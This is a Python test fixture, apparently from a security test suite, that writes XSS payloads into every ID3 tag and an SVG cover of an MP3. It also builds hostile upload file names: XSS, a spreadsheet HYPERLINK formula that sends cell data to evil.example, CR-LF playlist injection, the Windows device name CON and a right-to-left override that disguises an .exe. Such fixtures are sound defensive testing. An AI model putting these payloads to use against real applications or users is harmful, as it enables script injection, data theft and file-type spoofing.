"""Hostile media for the security test: p0.mp3 with every ID3 text frame an XSS payload (title, artist, album, comment,
TXXX, a bogus SVG/HTML "cover"), and file names that try path traversal / Windows device names / CR-LF / formula
injection. mutagen writes the tags (skipped → plain bytes when mutagen is missing)."""
import os, shutil, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))

def P(t): return f'<img src=x onerror="__xss(\'{t}\')">'
def Q(t): return f'x"><img src=x onerror="__xss(\'{t}\')">'

# names handed to <input type=file> (a File's name can hold anything but "/" on most systems; Playwright passes them as is)
NAMES = {
    'xss':     P('file.name') + ' - ' + Q('file.title') + '.mp3',
    'formula': '=HYPERLINK("https://evil.example/?x="&A1,"click") - @SUM(1+1).mp3',
    'device':  'CON.mp3',
    'crlf':    'Artist\r\n#EXTINF:1,injected\r\nhttps://evil.example/x.mp3 - Title.mp3',
    'dots':    '..  .mp3',
    'bidi':    'Song ' + chr(0x202E) + 'gpj.exe - Artist.mp3',
}

def tagged_mp3(out_dir=None):
    """→ path of a copy of p0.mp3 whose tags are payloads"""
    out_dir = out_dir or tempfile.mkdtemp(prefix='crevil-')
    dst = os.path.join(out_dir, 'evil-tags.mp3')
    shutil.copy(os.path.join(HERE, 'p0.mp3'), dst)
    try:
        from mutagen.id3 import ID3, TIT2, TPE1, TALB, COMM, TXXX, APIC, TCON, ID3NoHeaderError
        try: tags = ID3(dst)
        except ID3NoHeaderError: tags = ID3()
        tags.add(TIT2(encoding=3, text=P('tag.title')))
        tags.add(TPE1(encoding=3, text=Q('tag.artist')))
        tags.add(TALB(encoding=3, text=P('tag.album')))
        tags.add(TCON(encoding=3, text=P('tag.genre')))
        tags.add(COMM(encoding=3, lang='eng', desc='', text=P('tag.comment')))
        tags.add(TXXX(encoding=3, desc=Q('tag.txxx.desc'), text=P('tag.txxx')))
        tags.add(APIC(encoding=3, mime='image/svg+xml', type=3, desc=P('tag.apic'),
                      data=b'<svg xmlns="http://www.w3.org/2000/svg" onload="__xss(\'tag.cover\')"><script>__xss(\'tag.cover.script\')</script></svg>'))
        tags.save(dst, v2_version=3)
    except ImportError:
        pass
    return dst

def files(names=('xss', 'formula', 'device', 'crlf', 'dots', 'bidi'), src='p0.mp3'):
    """Playwright file payloads {name, mimeType, buffer} with hostile names (audio = the fixture)"""
    data = open(os.path.join(HERE, src), 'rb').read()
    return [{'name': NAMES[n], 'mimeType': 'audio/mpeg', 'buffer': data} for n in names]

if __name__ == '__main__':
    print(tagged_mp3())
